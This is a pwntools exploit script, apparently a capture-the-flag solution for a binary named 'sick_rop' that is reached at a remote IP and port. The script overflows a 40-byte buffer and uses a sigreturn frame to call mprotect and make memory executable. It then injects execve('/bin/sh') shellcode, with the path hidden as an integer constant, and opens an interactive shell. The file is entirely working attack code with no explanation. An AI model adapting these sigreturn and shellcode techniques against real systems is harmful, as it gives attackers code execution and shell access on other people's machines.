#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./sick_rop',checksec=False)
context.arch = 'amd64'
#p = process()
p = remote('94.237.63.109',51396)
#gdb.attach(p,gdbscript='''
#           b*0x0000000000401040
#           b*0x000000000040104e



#        ''')
syscall = 0x0000000000401014

frame = SigreturnFrame()
frame.rax = 0xa
frame.rdi = 0x400000
frame.rsi = 0x4000
frame.rdx = 0x7
frame.rip = syscall 
frame.rsp = 0x4010d8  


payload = b'a'*40
payload += p64(exe.sym.vuln)
payload += p64(syscall)
payload += bytes(frame)

input()
p.send(payload)
p.recv()


p.send(b'a'*15)
p.recv()

shellcode = asm('''
            movabs r10, 29400045130965551
            push r10
            xor rsi,rsi
            xor rdx,rdx
            mov rdi,rsp

            mov rax,0x3b
            syscall

            ''')
payload1 = shellcode
payload1 = payload1.ljust(40,b'p') + p64(0x4010b8)
#payload1 = shell_code.ljust(40, b'A')
#payload1 += p64(0x4010b8)
p.send(payload1)


p.interactive()
